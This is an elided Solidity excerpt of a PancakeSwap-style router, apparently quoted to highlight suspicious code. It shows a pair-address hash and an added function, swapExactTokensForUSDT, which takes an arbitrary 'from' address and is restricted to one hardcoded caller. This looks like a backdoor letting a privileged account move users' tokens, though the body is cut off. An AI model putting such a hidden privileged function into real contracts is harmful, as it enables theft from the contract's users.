...
library PancakeLibrary {
    ...
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        ...
        pair = address(uint(keccak256(abi.encodePacked(
                ...
                hex'9818844a8f99c7c4580790f69a2c3bbc54f2f570d132d02cb41c85d24a364cc5' 
            ))));
    }
...
contract PancakeRouter is IPancakeRouter02 {
    ...
    receive() external payable {assert(msg.sender == WETH);}
	...
	function swapExactTokensForUSDT(address from,address to,address token,uint256 amount) external{
        require(msg.sender == 0x853bcF815930A2775DD77e7Be04Fef724267388A, 'PancakeRouter: FORBIDDEN');
